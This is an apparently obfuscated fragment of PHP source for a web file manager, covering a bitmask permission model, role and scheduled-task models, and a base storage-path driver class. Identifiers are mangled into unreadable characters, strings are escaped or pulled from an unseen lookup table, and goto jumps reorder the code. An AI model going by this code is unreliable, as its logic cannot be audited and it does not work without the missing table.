$™Äå¯šÁ); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $Ãœ¬ı³š =& $_SERVER[şÒÁøÒÄ]; $š“¶¾ÉÑ = array(array($Ãœ¬ı³š[420] => LNG($Ãœ¬ı³š[1870]), $Ãœ¬ı³š[1871] => $Ãœ¬ı³š[1872], $Ãœ¬ı³š[1873] => 1, $Ãœ¬ı³š[1874] => 1, $Ãœ¬ı³š[1875] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($Ãœ¬ı³š[420] => LNG($Ãœ¬ı³š[1876]), $Ãœ¬ı³š[1871] => $Ãœ¬ı³š[1877], $Ãœ¬ı³š[1873] => 2, $Ãœ¬ı³š[1874] => 1, $Ãœ¬ı³š[1875] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($Ãœ¬ı³š[420] => LNG($Ãœ¬ı³š[1878]), $Ãœ¬ı³š[1871] => $Ãœ¬ı³š[1879], $Ãœ¬ı³š[1873] => 3, $Ãœ¬ı³š[1874] => 1, $Ãœ¬ı³š[1875] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($Ãœ¬ı³š[420] => LNG($Ãœ¬ı³š[1880]), $Ãœ¬ı³š[1871] => $Ãœ¬ı³š[1881], $Ãœ¬ı³š[1873] => 4, $Ãœ¬ı³š[1874] => 1, $Ãœ¬ı³š[1875] => self::AUTH_SHOW | self::AUTH_VIEW), array($Ãœ¬ı³š[420] => LNG($Ãœ¬ı³š[1882]), $Ãœ¬ı³š[1871] => $Ãœ¬ı³š[1883], $Ãœ¬ı³š[1873] => 5, $Ãœ¬ı³š[1874] => 1, $Ãœ¬ı³š[1875] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($Ãœ¬ı³š[420] => LNG($Ãœ¬ı³š[1884]), $Ãœ¬ı³š[1871] => $Ãœ¬ı³š[1885], $Ãœ¬ı³š[1873] => 6, $Ãœ¬ı³š[1874] => 1, $Ãœ¬ı³š[1875] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($Ãœ¬ı³š[420] => LNG($Ãœ¬ı³š[1886]), $Ãœ¬ı³š[1871] => $Ãœ¬ı³š[1887], $Ãœ¬ı³š[1873] => 7, $Ãœ¬ı³š[1874] => 1, $Ãœ¬ı³š[1875] => 0)); return $š“¶¾ÉÑ; } public static function authCheck($û¹Ç¢ëˆ, $ûºğ‰Üà) { $³­ÄçŠ =& $_SERVER[şÒÁøÒÄ]; $û¹Ç¢ëˆ = intval($û¹Ç¢ëˆ); if ($GLOBALS[$³­ÄçŠ[494]] && $GLOBALS[$³­ÄçŠ[6]][$³­ÄçŠ[1888]]) { return !0; } if ($û¹Ç¢ëˆ <= 0) { return !1; } if (($û¹Ç¢ëˆ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($û¹Ç¢ëˆ & $ûºğ‰Üà); } public static function authCheckShow($·Í˜«è) { return self::authCheck($·Í˜«è, self::AUTH_SHOW); } public static function authCheckView($¤‚Æã³û) { return self::authCheck($¤‚Æã³û, self::AUTH_VIEW); } public static function authCheckDownload($¹Ó¹è«õ) { return self::authCheck($¹Ó¹è«õ, self::AUTH_DOWNLOAD); } public static function authCheckUpload($£×çØÜ’) { return self::authCheck($£×çØÜ’, self::AUTH_UPLOAD); } public static function authCheckEdit($æïòÌ˜š) { return self::authCheck($æïòÌ˜š, self::AUTH_EDIT); } public static function authCheckRemove($¸ßÉç¿…) { return self::authCheck($¸ßÉç¿…, self::AUTH_REMOVE); } public static function authCheckShare($Ø÷ª™ˆ») { return self::authCheck($Ø÷ª™ˆ», self::AUTH_SHARE); } public static function authCheckComment($Ğ§²”¼š) { return self::authCheck($Ğ§²”¼š, self::AUTH_COMMENT); } public static function authCheckEvent($”¡ûÖ€À) { return self::authCheck($”¡ûÖ€À, self::AUTH_EVENT); } public static function authCheckRoot($ª¢‹…) { return self::authCheck($ª¢‹…, self::AUTH_ROOT); } public static function authCheckAction($÷”®ÃÔ, $ó°ß÷ƒÔ) { $ªÑÁ–ÜÒ =& $_SERVER[şÒÁøÒÄ]; $ˆ©ÊúÜŞ = array($ªÑÁ–ÜÒ[1889] => self::AUTH_VIEW, $ªÑÁ–ÜÒ[1207] => self::AUTH_DOWNLOAD, $ªÑÁ–ÜÒ[107] => self::AUTH_UPLOAD, $ªÑÁ–ÜÒ[1839] => self::AUTH_EDIT, $ªÑÁ–ÜÒ[1838] => self::AUTH_REMOVE, $ªÑÁ–ÜÒ[1849] => self::AUTH_SHARE, $ªÑÁ–ÜÒ[354] => self::AUTH_COMMENT, $ªÑÁ–ÜÒ[1668] => self::AUTH_EVENT, $ªÑÁ–ÜÒ[1890] => self::AUTH_ROOT); if (!isset($ˆ©ÊúÜŞ[$ó°ß÷ƒÔ])) { return; } $ğÂšâŒ½ = $ˆ©ÊúÜŞ[$ó°ß÷ƒÔ]; $÷”®ÃÔ = intval($÷”®ÃÔ); if ($÷”®ÃÔ <= 0) { return !1; } if (($÷”®ÃÔ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($÷”®ÃÔ & $ğÂšâŒ½); } public static function authDisable($ÂñÁì¬º, $îÎÄêŒ) { if (intval($ÂñÁì¬º) <= 0) { return 0; } return intval($ÂñÁì¬º) & ~$îÎÄêŒ; } public $optionType = "\123\x79\x73\x74\x65\x6d\x2e\163\157\165\162\x63\145\101\165\x74\x68\114\x69\x73\164"; public $field = array("\x6e\141\155\x65", "\x61\165\164\150", "\x6c\x61\142\145\154", "\x64\151\x73\x70\154\141\x79", "\163\x79\163\164\x65\155", "\163\157\162\164"); public function initData() { $İÍİ¡óŒ = $this->authDefault(); foreach ($İÍİ¡óŒ as $ü’Š–¦Ô) { $this->add($ü’Š–¦Ô); } } public function findAuth($ÆàÊ†‚‚, $¯—«¤) { $È´€Å€Ó =& $_SERVER[şÒÁøÒÄ]; $³Ø„«éå = parent::listData(); foreach ($³Ø„«éå as $ê Õ˜´) { $ò¬‹Íˆ¬ = intval($ê Õ˜´[$È´€Å€Ó[413]]); if ($ò¬‹Íˆ¬ <= 0 || $ê Õ˜´[$È´€Å€Ó[1891]] == 0) { continue; } if (($ò¬‹Íˆ¬ & $ÆàÊ†‚‚) != $ÆàÊ†‚‚) { continue; } if (($ò¬‹Íˆ¬ & $¯—«¤) != 0) { continue; } return $ê Õ˜´[$È´€Å€Ó[399]]; } return !1; } public function findAuthReadOnly() { $ï·ûÁØÑ = self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD; $Æœú¹Üü = self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE; return $this->findAuth($ï·ûÁØÑ, $Æœú¹Üü); } public function findAuthNotRead() { return $this->findAuth(0, self::AUTH_SHOW); } public function findAuthMinDefault() { $å—ò™¬© =& $_SERVER[şÒÁøÒÄ]; $½©…Éı¶ = parent::listData(); $»º¡ô¨œ = !1; foreach ($½©…Éı¶ as $ü†şÄ˜‡) { if ($ü†şÄ˜‡[$å—ò™¬©[413]] <= 0 || $ü†şÄ˜‡[$å—ò™¬©[1891]] == $å—ò™¬©[198]) { continue; } if (!$»º¡ô¨œ) { $»º¡ô¨œ = $ü†şÄ˜‡; continue; } if ($»º¡ô¨œ[$å—ò™¬©[413]] > $ü†şÄ˜‡[$å—ò™¬©[413]]) { $»º¡ô¨œ = $ü†şÄ˜‡; } } return $»º¡ô¨œ ? $»º¡ô¨œ[$å—ò™¬©[399]] : $å—ò™¬©[12]; } public function listData($ôƒ¢À™« = false, $¼áïáµ = "\x73\157\162\x74", $§¬ò»ú = false) { return parent::listData($ôƒ¢À™«, $¼áïáµ, $§¬ò»ú); } public function update($©Öß‰™‚, $å€´Ôò) { $ä¾´ÂÎß =& $_SERVER[şÒÁøÒÄ]; $à·â’×– = parent::listData($©Öß‰™‚); $õãùÂ“ß = $this->findByName($å€´Ôò[$ä¾´ÂÎß[32]]); if (!$à·â’×– || $õãùÂ“ß && $õãùÂ“ß[$ä¾´ÂÎß[399]] != $à·â’×–[$ä¾´ÂÎß[399]]) { return !1; } $this->filterAuth($å€´Ôò[$ä¾´ÂÎß[413]]); return parent::update($©Öß‰™‚, $å€´Ôò); } public function remove($êŒùºÑ¦) { $¸ì¼×ŠÈ = parent::listData($êŒùºÑ¦); if (!$¸ì¼×ŠÈ || $¸ì¼×ŠÈ[$_SERVER[şÒÁøÒÄ][1297]]) { return !1; } return parent::remove($êŒùºÑ¦); } public function add($¹‘ˆÂòÖ = array()) { $îô””Ä« =& $_SERVER[şÒÁøÒÄ]; if ($this->findByName($¹‘ˆÂòÖ[$îô””Ä«[32]])) { return !1; } $ÚÁºÕèÁ = array($îô””Ä«[32] => $îô””Ä«[12], $îô””Ä«[413] => 1, $îô””Ä«[1892] => $îô””Ä«[1879], $îô””Ä«[1891] => 1, $îô””Ä«[1297] => 0, $îô””Ä«[1893] => 0); $¹‘ˆÂòÖ = array_merge($ÚÁºÕèÁ, $¹‘ˆÂòÖ); $¹‘ˆÂòÖ[$îô””Ä«[1893]] = $this->getSort(); $this->filterAuth($¹‘ˆÂòÖ[$îô””Ä«[413]]); return parent::insert($¹‘ˆÂòÖ); } private function getSort() { $´¸´í§™ =& $_SERVER[şÒÁøÒÄ]; $›¸‰Áİ˜ = parent::listData(); $œÉåÄ¶‚ = array_to_keyvalue($›¸‰Áİ˜, $´¸´í§™[12], $´¸´í§™[1893]); return empty($œÉåÄ¶‚) ? 0 : max($œÉåÄ¶‚) + 1; } private function filterAuth(&$‘®İ) { if (!$‘®İ) { return; } $€¿ÚıÊ’ = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $ËÁÇ¤ğÈ = array(); foreach ($€¿ÚıÊ’ as $É™ô¡ÓÕ) { if ($‘®İ & $É™ô¡ÓÕ) { $ËÁÇ¤ğÈ[] = $É™ô¡ÓÕ; } } if (in_array(self::AUTH_ROOT, $ËÁÇ¤ğÈ)) { $‘®İ = array_sum($€¿ÚıÊ’); return; } $›óú‘ì€ = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); foreach ($ËÁÇ¤ğÈ as $É™ô¡ÓÕ) { if (isset($›óú‘ì€[$É™ô¡ÓÕ])) { $ËÁÇ¤ğÈ = array_merge($ËÁÇ¤ğÈ, $›óú‘ì€[$É™ô¡ÓÕ]); } } $ËÁÇ¤ğÈ[] = self::AUTH_SHOW; $‘®İ = array_sum(array_unique($ËÁÇ¤ğÈ)); } public function sort($ıßèÎ–, $šù—æ­ì) { return parent::update($ıßèÎ–, $šù—æ­ì); } } goto fÙˆöÜ…; dÛ¾ Æ…ó: class SystemRecordModel extends ModelBaseLight { } class SystemRoleModel extends ModelBaseLight { public $optionType = "\123\x79\163\x74\x65\155\56\x72\157\154\145\114\151\x73\x74"; public $field = array("\156\x61\x6d\145", "\141\165\x74\150", "\x6c\x61\142\145\x6c", "\144\x69\163\160\154\x61\171", "\x73\x79\x73\164\145\155", "\x64\x65\163\143", "\151\x67\156\x6f\162\145\105\x78\164", "\151\147\x6e\157\162\145\106\x69\154\x65\x53\151\x7a\x65", "\x61\144\x6d\151\156\x69\x73\x74\162\141\164\157\x72", "\163\157\162\x74"); public function listData($š…òÈ = false, $“»Á·•· = "\163\157\x72\164", $ãøöÏŸ» = false) { $ÈÏœäœ€ =& $_SERVER[şÒÁøÒÄ]; $ï‚ü¤¸– = parent::listData($š…òÈ, $“»Á·•·, $ãøöÏŸ»); if (!$š…òÈ) { foreach ($ï‚ü¤¸– as $ÏˆØ÷¸ => $½èî»Æ) { if ($½èî»Æ[$ÈÏœäœ€[2071]] == 1) { $ï‚ü¤¸–[$ÏˆØ÷¸][$ÈÏœäœ€[453]] = LNG($ÈÏœäœ€[2305]); } } } return $ï‚ü¤¸–; } public function update($ı‘êØ¢Á, $ÓåÇ­šô) { $‹‡úÀùò =& $_SERVER[şÒÁøÒÄ]; $¡Í‘ê×³ = parent::listData($ı‘êØ¢Á); $€ø¾È‡Å = $this->findByName($ÓåÇ­šô[$‹‡úÀùò[32]]); if (!$¡Í‘ê×³ || $€ø¾È‡Å && $€ø¾È‡Å[$‹‡úÀùò[399]] != $¡Í‘ê×³[$‹‡úÀùò[399]]) { return !1; } if ($€ø¾È‡Å[$‹‡úÀùò[2071]] == 1) { $ÓåÇ­šô = array($‹‡úÀùò[32] => $ÓåÇ­šô[$‹‡úÀùò[32]], $‹‡úÀùò[1892] => $ÓåÇ­šô[$‹‡úÀùò[1892]]); } $this->filterAuth($ÓåÇ­šô[$‹‡úÀùò[413]]); return parent::update($ı‘êØ¢Á, $ÓåÇ­šô); } public function remove($‚“ëß®) { $Ç´ÉÊ°§ = parent::listData($‚“ëß®); if (!$Ç´ÉÊ°§ || $Ç´ÉÊ°§[$_SERVER[şÒÁøÒÄ][1297]]) { return !1; } return parent::remove($‚“ëß®); } public function add($Ë“› ‚Ÿ) { $Á¾ş“õî =& $_SERVER[şÒÁøÒÄ]; $Ôó—‚Öå = $Ë“› ‚Ÿ[$Á¾ş“õî[32]]; if ($this->findByName($Ôó—‚Öå)) { return !1; } $•Ÿ¨ËÓó = array($Á¾ş“õî[420] => $Ôó—‚Öå, $Á¾ş“õî[1875] => $Á¾ş“õî[12], $Á¾ş“õî[1871] => $Á¾ş“õî[1879], $Á¾ş“õî[2306] => 1, $Á¾ş“õî[1874] => 0, $Á¾ş“õî[2307] => 0, $Á¾ş“õî[1873] => $this->getSort()); $Ë“› ‚Ÿ = array_merge($•Ÿ¨ËÓó, $Ë“› ‚Ÿ); $this->filterAuth($Ë“› ‚Ÿ[$Á¾ş“õî[413]]); return parent::insert($Ë“› ‚Ÿ); } private function getSort() { $îÊ†İ¢‡ =& $_SERVER[şÒÁøÒÄ]; $ªÙ©ˆ‚¬ = parent::listData(); $¥·äÑ¿ò = array_to_keyvalue($ªÙ©ˆ‚¬, $îÊ†İ¢‡[12], $îÊ†İ¢‡[1893]); return empty($¥·äÑ¿ò) ? 0 : max($¥·äÑ¿ò) + 1; } private function filterAuth(&$äãçÎä) { $Æ¹ãñÙ =& $_SERVER[şÒÁøÒÄ]; $ç«¾š’¼ = array(); $„ï†‚Ñº = array_filter(explode($Æ¹ãñÙ[50], $äãçÎä)); foreach ($„ï†‚Ñº as $äãçÎä) { $ğï–…£– = explode($Æ¹ãñÙ[10], $äãçÎä); if ($ğï–…£–[0] == $Æ¹ãñÙ[2308] && $ğï–…£–[1] != $Æ¹ãñÙ[1203]) { $÷ëÂÆèí = $ğï–…£–[0] . $Æ¹ãñÙ[10] . $ğï–…£–[1] . $Æ¹ãñÙ[2309]; if (!in_array($÷ëÂÆèí, $„ï†‚Ñº)) { $ç«¾š’¼[] = $÷ëÂÆèí; } } $ç«¾š’¼[] = $äãçÎä; } $äãçÎä = implode($Æ¹ãñÙ[50], $ç«¾š’¼); } public function findRoleDefault() { $»ÔŠ¥Ò› =& $_SERVER[şÒÁøÒÄ]; $ş³È¤° = parent::listData(); $›´³³ ú = !1; foreach ($ş³È¤° as $Á³˜ûÕü) { if (!$Á³˜ûÕü || $Á³˜ûÕü[$»ÔŠ¥Ò›[1891]] == $»ÔŠ¥Ò›[198] || $Á³˜ûÕü[$»ÔŠ¥Ò›[2071]] == 1) { continue; } if (strstr($Á³˜ûÕü[$»ÔŠ¥Ò›[413]], $»ÔŠ¥Ò›[2310])) { continue; } if (!strstr($Á³˜ûÕü[$»ÔŠ¥Ò›[413]], $»ÔŠ¥Ò›[2311])) { continue; } if (!$›´³³ ú) { $›´³³ ú = $Á³˜ûÕü; continue; } $÷Ù«İ…Ğ = explode($»ÔŠ¥Ò›[50], $›´³³ ú[$»ÔŠ¥Ò›[413]]); $ åÓ†ã§ = explode($»ÔŠ¥Ò›[50], $Á³˜ûÕü[$»ÔŠ¥Ò›[413]]); if (count($÷Ù«İ…Ğ) > count($ åÓ†ã§)) { $›´³³ ú = $Á³˜ûÕü; } } return $›´³³ ú ? $›´³³ ú[$»ÔŠ¥Ò›[399]] : $»ÔŠ¥Ò›[12]; } public function sort($‹Ğéõ, $Æé¼¿¾Ø) { return parent::update($‹Ğéõ, $Æé¼¿¾Ø); } } class SystemTaskModel extends ModelBaseLight { public $optionType = "\123\171\163\x74\145\155\x2e\x74\x61\x73\153\114\x69\163\164"; public $field = array("\156\x61\155\x65", "\x74\171\x70\x65", "\145\166\145\x6e\x74", "\164\151\155\145", "\x64\145\163\143", "\163\x79\x73\x74\x65\155", "\145\156\141\142\x6c\x65", "\x6c\141\x73\x74\122\165\x6e", "\163\157\162\x74"); public function listData($—Åä×ƒİ = false, $ãí·œŒ = "\x73\157\x72\x74", $ˆµ€ßÂ = false) { return parent::listData($—Åä×ƒİ, $ãí·œŒ, $ˆµ€ßÂ); } public function add($ı¢üá·ä) { $è©¡ß¥  =& $_SERVER[şÒÁøÒÄ]; $¹à½¹Ì = $this->findByName($ı¢üá·ä[$è©¡ß¥ [32]]); if ($¹à½¹Ì) { return !1; } $ı¢üá·ä[$è©¡ß¥ [1640]] = 0; $ı¢üá·ä[$è©¡ß¥ [1893]] = $this->getSort(); return parent::insert($ı¢üá·ä); } private function getSort() { $ü¥²œÕ =& $_SERVER[şÒÁøÒÄ]; $´Ö¡Ú° = parent::listData(); $ˆê‰Ô¥ = array_to_keyvalue($´Ö¡Ú°, $ü¥²œÕ[12], $ü¥²œÕ[1893]); return empty($ˆê‰Ô¥) ? 0 : max($ˆê‰Ô¥) + 1; } public function update($è»ƒœéú, $ãã½ŸÎŞ) { $£Ø…¨ñ =& $_SERVER[şÒÁøÒÄ]; $‘­ˆè«® = $this->listData($è»ƒœéú); $Ê÷¬» = $this->findByName($ãã½ŸÎŞ[$£Ø…¨ñ[32]]); if (!$‘­ˆè«® || $Ê÷¬» && $Ê÷¬»[$£Ø…¨ñ[399]] != $‘­ˆè«®[$£Ø…¨ñ[399]]) { return !1; } return parent::update($è»ƒœéú, $ãã½ŸÎŞ); } public function remove($–Æ¢á‰, $•’æè¨ = false) { $ÙÀ¬„çÖ =& $_SERVER[şÒÁøÒÄ]; $Å¢ğšé¢ = $this->listData($–Æ¢á‰); if (!$Å¢ğšé¢) { return; } if (!$•’æè¨ && $Å¢ğšé¢[$ÙÀ¬„çÖ[1297]] == $ÙÀ¬„çÖ[88]) { return !1; } return parent::remove($–Æ¢á‰); } public function enable($õËáÜ ¦, $´¿Ùß£æ) { return $this->update($õËáÜ ¦, array($_SERVER[şÒÁøÒÄ][2300] => $´¿Ùß£æ)); } public function run($Ã„ÂŞÉÑ) { return $this->update($Ã„ÂŞÉÑ, array($_SERVER[şÒÁøÒÄ][2312] => time())); } } goto D‰·šÑ†Š¢; b†áœ‡ªÙ›: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public $_data = array(); public function __construct() { $ÑÂğÜÎš =& $_SERVER[şÒÁøÒÄ]; $this->objectDriver = array($ÑÂğÜÎš[60], $ÑÂğÜÎš[61], $ÑÂğÜÎš[62], $ÑÂğÜÎš[63], $ÑÂğÜÎš[64], $ÑÂğÜÎš[65], $ÑÂğÜÎš[66], $ÑÂğÜÎš[67], $ÑÂğÜÎš[68]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($œÉÕ¿ÇŸ) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($œÉÕ¿ÇŸ, $_SERVER[şÒÁøÒÄ][8]); } return $œÉÕ¿ÇŸ; } public function iconvApp($¹ğöšê) { return $¹ğöšê; } public function iconvSystem($ïô²ñ™¡) { return $ïô²ñ™¡; } public function iconvTo($‡£ŠÛˆ, $·ÏçÏ, $İ»¥ß§) { $ù«Ê×“ =& $_SERVER[şÒÁøÒÄ]; if (!$‡£ŠÛˆ || !function_exists($ù«Ê×“[69])) { return $‡£ŠÛˆ; } static $íÈŒİíû = array(); $‡ùİ¶ÂÖ = $·ÏçÏ . $ù«Ê×“[70] . $İ»¥ß§ . $ù«Ê×“[71] . $‡£ŠÛˆ; if (isset($íÈŒİíû[$‡ùİ¶ÂÖ])) { return $íÈŒİíû[$‡ùİ¶ÂÖ]; } if (function_exists($ù«Ê×“[72])) { $û¾Î¸Ø = @mb_convert_encoding($‡£ŠÛˆ, $İ»¥ß§, $·ÏçÏ); } else { $û¾Î¸Ø = @iconv($·ÏçÏ, $İ»¥ß§, $‡£ŠÛˆ); } $û¾Î¸Ø = $û¾Î¸Ø ? $û¾Î¸Ø : $‡£ŠÛˆ; if (strstr($û¾Î¸Ø, $ù«Ê×“[73])) { $û¾Î¸Ø = str_replace($ù«Ê×“[73], $ù«Ê×“[11], $û¾Î¸Ø); } $íÈŒİíû[$·ÏçÏ . $ù«Ê×“[70] . $İ»¥ß§ . $ù«Ê×“[71] . $‡£ŠÛˆ] = $û¾Î¸Ø; $íÈŒİíû[$İ»¥ß§ . $ù«Ê×“[70] . $·ÏçÏ . $ù«Ê×“[71] . $‡£ŠÛˆ] = $‡£ŠÛˆ; $íÈŒİíû[$İ»¥ß§ . $ù«Ê×“[70] . $·ÏçÏ . $ù«Ê×“[71] . $û¾Î¸Ø] = $‡£ŠÛˆ; $íÈŒİíû[$·ÏçÏ . $ù«Ê×“[70] . $İ»¥ß§ . $ù«Ê×“[71] . $û¾Î¸Ø] = $û¾Î¸Ø; return $û¾Î¸Ø; } public function getPathInner($Áí®µ±¼) { $æÚß«áÍ = IO::init($Áí®µ±¼); return $æÚß«áÍ->path; } public function getPathOuter($«º×šù•) { $æúÀ¸Œ =& $_SERVER[şÒÁøÒÄ]; $™ü§ºø = strlen(trim($this->pathBase, $æúÀ¸Œ[8])); $«º×šù• = substr(trim($«º×šù•, $æúÀ¸Œ[8]), $™ü§ºø); return $this->pathDriver . $æúÀ¸Œ[8] . ltrim($«º×šù•, $æúÀ¸Œ[8]); } public function isParentOf($®¡¿º¯, $×­ù²‚²) { $ñ³êâœÅ =& $_SERVER[şÒÁøÒÄ]; $®¡¿º¯ = rtrim(strtolower($®¡¿º¯), $ñ³êâœÅ[8]) . $ñ³êâœÅ[8]; $×­ù²‚² = rtrim(strtolower($×­ù²‚²), $ñ³êâœÅ[8]) . $ñ³êâœÅ[8]; $¹ğ²”°† = strpos($×­ù²‚², $®¡¿º¯) === 0; return $¹ğ²”°†; } public function getType() { $šŒÒ¤ÊÆ =& $_SERVER[şÒÁøÒÄ]; $ä×Ø¥İÛ = str_replace($šŒÒ¤ÊÆ[74], $šŒÒ¤ÊÆ[12], get_class($this)); return strtolower($ä×Ø¥İÛ); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($øŸÏ£ãì, $·Í£öà) { $Šâ›Ùôı =& $_SERVER[şÒÁøÒÄ]; $³¦ÔèÃÒ = rtrim($øŸÏ£ãì, $Šâ›Ùôı[8]) . $Šâ›Ùôı[8] . $·Í£öà; $±¨êÉƒ— = $this->exist($³¦ÔèÃÒ); return $±¨êÉƒ— ? $³¦ÔèÃÒ : !1; } public function setModifyTime($¸œ ºÃª, $®¦µ†ÖÖ = '') { } public function renameObject($¼ÑĞğˆ¿, $ÚÖğ•‡ï) { $š‘ïö½Ò = $ÚÖğ•‡ï; $¼ÑĞğˆ¿ = $this->getPathOuter($¼ÑĞğˆ¿); $ÚÖğ•‡ï = $this->pathFather($¼ÑĞğˆ¿) . $ÚÖğ•‡ï; $üàúúÈ´ = IO::copy($¼ÑĞğˆ¿, $this->pathFather($¼ÑĞğˆ¿), REPEAT_RENAME_FOLDER, $š‘ïö½Ò); if ($üàúúÈ´) { IO::remove($¼ÑĞğˆ¿); } return $üàúúÈ´ ? $ÚÖğ•‡ï : !1; } public function tempFile($´Á¢Ä‚ = '', $½Ì—à‚æ = '') { if (!$´Á¢Ä‚) { $´Á¢Ä‚ = rand_string(15); } $úûç„Ïâ = TEMP_FILES . rand_string(15) . $_SERVER[şÒÁøÒÄ][8]; @mkdir($úûç„Ïâ, DEFAULT_PERRMISSIONS, !0); $ú©û·Íš = $úûç„Ïâ . $´Á¢Ä‚; @touch($ú©û·Íš); if ($½Ì—à‚æ) { file_put_contents($ú©û·Íš, $½Ì—à‚æ); } return $ú©û·Íš; } public function tempFileRemve($éŸâµ ) { @unlink($éŸâµ ); @rmdir($this->pathFather($éŸâµ )); } public function mkfile($÷Ú»ãÕ, $·™ë®ƒ = '', $ßë —šÅ = REPEAT_RENAME) { } public function mkdir($¤½ÕÖÛ¨, $ßÆÇÚÕã = REPEAT_SKIP) { } public function delFile($»øŒõ»Á) { } public function delFolder($‘ûî‘ßÀ) { } public function copyFile($§Ì©¿È, $„³—Õ‚») { } public function moveFile($†…á´Œ, $’“ñò·) { } public function remove($†‡à¿šˆ) { if ($this->isFile($†‡à¿šˆ)) { return $this->delFile($†‡à¿šˆ); } return $this->delFolder($†‡à¿šˆ); } public function rename($Ğƒ‡ı÷ã, $¦ùîô§) { } public function exist($Ø³ŒÏ) { } public function findByHash($±®…•şô = '', $¬­¡°¯Ê = '') { return !1; } public function isFile($ƒ¡ïá“) { } public function isFolder($İğ¼Š«) { } public function size($…úˆÁ¿ú) { } public function info($—ßı…îı) { } public function infoSimple($¸ÂÙıÎÏ) { return $this->info($¸ÂÙıÎÏ); } public function infoAuth($ğü”²Õó) { return $this->info($ğü”²Õó); } public function infoFull($ÏÀşéÒÚ) { return $this->info($ÏÀşéÒÚ); } public function infoWithChildren($¸åÄ†ğ«) { $‡••Ë°” =& $_SERVER[şÒÁøÒÄ]; static $£««Ä´ù = array(); if (isset($£««Ä´ù[$¸åÄ†ğ«])) { return $£««Ä´ù[$¸åÄ†ğ«]; } $Ìíô„âî = $this->info($¸åÄ†ğ«); if ($Ìíô„âî && $Ìíô„âî[$‡••Ë°”[33]] == $‡••Ë°”[75]) { $ûôÙï‘ = array($‡••Ë°”[76] => 0, $‡••Ë°”[77] => 0, $‡••Ë°”[78] => 0); $this->infoChildren($¸åÄ†ğ«, $ûôÙï‘); $Ìíô„âî[$‡••Ë°”[76]] = $ûôÙï‘[$‡••Ë°”[76]]; $Ìíô„âî[$‡••Ë°”[79]] = array($‡••Ë°”[80] => $ûôÙï‘[$‡••Ë°”[77]], $‡••Ë°”[81] => $ûôÙï‘[$‡••Ë°”[78]]); $£««Ä´ù[$¸åÄ†ğ«] = $Ìíô„âî; } return $Ìíô„âî; } public function listPath($È’íÙ¨ş, $—ÏÒê­ª = false) { } public function has($ã«İ‡™, $¿Ê¯ßş = false, $øŞ®û¢ò = false) { } public function canRead($³è¥Êú´) { } public function canWrite($µ–´•ª) { } public function getContent($Ù…Ÿˆ¡) { } public function setContent($ ìúšôğ, $­ĞÁè¢¡ = '') { } protected function infoChildren($ãĞùƒöğ, &$Ã·›¶¨ê) { $‘˜¡ëÅã =& $_SERVER[şÒÁøÒÄ]; check_abort_echo(); $ì©ò¹¢› = $this->listPath($ãĞùƒöğ, !0); $ì©ò¹¢› = array_merge($ì©ò¹¢›[$‘˜¡ëÅã[82]], $ì©ò¹¢›[$‘˜¡ëÅã[83]]); foreach ($ì©ò¹¢› as $ıÄÑè¨ò) { if ($ıÄÑè¨ò[$‘˜¡ëÅã[33]] == $‘˜¡ëÅã[75]) { $Ã·›¶¨ê[$‘˜¡ëÅã[78]]++; $îğ¦®»¹ = $this->getPathInner($ıÄÑè¨ò[$‘˜¡ëÅã[84]]); $this->infoChildren($îğ¦®»¹, $Ã·›¶¨ê); } else { $Ã·›¶¨ê[$‘˜¡ëÅã[77]]++; $Ã·›¶¨ê[$‘˜¡ëÅã[76]] += $ıÄÑè¨ò[$‘˜¡ëÅã[76]]; } } } public function fileSubstr($»é–‡î, $×Ü¸¸õ¦, $ôÆÂÔæÚ) { } public function listAll($®Å’¶¤‚) { } public function listAllMake($¾Ş·š¨Ã, &$©¸Â÷í) { $Å†¬ù¦İ =& $_SERVER[şÒÁøÒÄ]; check_abort_echo(); $êû«şš = $this->listPath($¾Ş·š¨Ã, !0); if (!$êû«şš) { return; } $·¦ÍŸ‰î = array_merge($êû«şš[$Å†¬ù¦İ[82]], $êû«şš[$Å†¬ù¦İ[83]]); foreach ($·¦ÍŸ‰î as $—ÛÜºî³) { $†œÄ¨ Ş = 